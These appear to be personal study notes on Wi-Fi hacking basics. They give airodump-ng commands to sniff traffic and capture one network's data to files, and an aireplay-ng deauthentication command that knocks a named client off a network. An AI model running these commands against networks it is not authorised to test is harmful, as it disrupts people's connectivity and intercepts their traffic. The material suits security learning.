# Wireless networking basics 02

## Sniff packets
- used tool: airodump-ng

- First enable monitor mode as described on `01_network_basics.MD`

```bash
airodump-ng wlan0 # starts sniffing. On default only 2.4GHz

airodump-ng --band a wlan0 # Sniff 5GHz

airodump-ng --band abg wlan0 # Sniff 2.4+5GHz
```
Description of the output:
- BSSID : target MAC adress
- PWR : signal strength (higher the nubmer, bigger the signal)
- Beacons: Frames sent by the network to broadcast its existence
- Data: number of data packets and data frames
- #/s: number of data packets collected in past 10s
- CH: channel that network works on
- MB: Maximum speed of network
- ENC: encryption of the network
- CIPHER: cipher used in the network
- AUTH: auth used on the network
- ESSID: Name of the network

## Sniff all data only from one target (see also all the connected clients)

```bash
airodump-ng --bssid B0:95:75:42:27:E3 --channel 44 --write test wlan0 # writes output to the files named "test". --bssid and --channel are from results of running previous command
```

## Deauthentication attack with aireplay-ng (disconnect user from WiFi)

Disconnect any device from any network without being part of that network (unauthenticated to the network)

```bash
aireplay-ng --deauth 10000000 -a B0:95:75:42:27:E3 -c 5A:6E:23:9B:29:D8 -D wlan0
```
- --deauth => deauth attack, send given number of packets
- --a => MAC adress of target network
- --c => client we want to disconnect
- -D needs to be only used if using 5GHz



